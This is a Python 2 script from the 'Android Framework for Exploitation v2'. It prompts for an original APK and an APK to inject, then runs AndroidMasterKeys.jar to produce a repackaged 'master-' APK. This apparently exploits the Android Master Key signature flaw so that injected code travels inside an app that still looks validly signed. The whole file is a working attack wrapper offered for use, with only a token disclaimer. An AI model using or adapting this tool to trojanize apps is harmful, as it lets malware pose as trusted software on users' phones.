#!/usr/bin/python
#----------------------------------------------------------------------------------------------#
#Android Framework for Exploitation v-2                                                        #
# (C)opyright 2013 - XYS3C                                                                     #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#              The programs are provided as is without any guarantees or warranty.             #
#---Defaults-----------------------------------------------------------------------------------#
import os
import glob
import shutil
import commands
import subprocess
import time
import logging
import signal
import sys
def signal_handler(signal, frame):
	logging.warn("\nYou pressed Ctrl+C! dont forget to clean the TEMP file !")
	print "Wait 5 seconds"
	time.sleep(5)
	sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)
################################################################################################
#                                 MAIN SCREEN                                                  #
################################################################################################

print """
---- The Android Framework For Exploitation v2.0  ----
 _______  _______  _______                _______     _______ 
(  ___  )(  ____ \(  ____ \    |\     /|  / ___   )   (  __   )
| (   ) || (    \/| (    \/ _  | )   ( |  \/   )  |   | (  )  |
| (___) || (__    | (__    (_) | |   | |      /   )   | | /   |
|  ___  ||  __)   |  __)       ( (   ) )    _/   /    | (/ /) |
| (   ) || (      | (       _   \ \_/ /    /   _/     |   / | |
| )   ( || )      | (____/\(_)   \   /    (   (__/\ _ |  (__) |
|/     \||/       (_______/       \_/     \_______/(_)(_______)
"""
print "Copyright Reserved : XYS3C (Visit us at http://xysec.com)"
print"----------------------------------------------------------------"
print "Files Available in the Input Folders:"
print "----LIST----"
os.chdir("../../Input")
tmp = os.getcwd()+"/../temp"
bin = os.getcwd()+"/../bin"
outputpath = os.getcwd()+"/../Output"
if not os.path.exists(tmp+"/masterkey"):
	os.makedirs(tmp+"/masterkey")
masterkeydir = tmp+"/masterkey"

types = ('*.apk', '*.zip')

for files in types:
	for filest in glob.glob(files):
		print "* " + filest

origapp = raw_input("Enter the name of the original apk/zip: ")
print "********************************"

while not os.path.isfile(origapp):
	print "APK/ZIP not found, try again !"
	print "----LIST-----"
	for files in types:
		for filest in glob.glob(files):
			print "* " + filest
	origapp = raw_input("Enter the name of the original apk/zip: ")

if os.name == 'nt':
	os.system('cls')
else:
	os.system('clear')


print "Files Available in the Input Folders to Inject:"
print "----LIST----"
for files in types:
	for filest in glob.glob(files):
		if filest != origapp:
			print "* " + filest
			
injapp = raw_input("Enter the name of the apk you want to inject: ")
print "********************************"

while not os.path.isfile(injapp) or injapp == origapp:
	print "APK not found, try again !"
	print "----LIST-----"
	for files in types:
		for filest in glob.glob(files):
			if filest != origapp:
				print "* " + filest
	injapp = raw_input("Enter the name of the apk you want to inject: ")
	
shutil.copy(injapp,masterkeydir)
shutil.copy(origapp,masterkeydir)

subprocess.call(['java', '-jar', bin+'/AndroidMasterKeys.jar', '-a', masterkeydir+"/"+origapp, '-z', masterkeydir+"/"+injapp, '-o', outputpath+"/master-"+origapp])
print "Output APK in -> " + outputpath+"/master-"+origapp


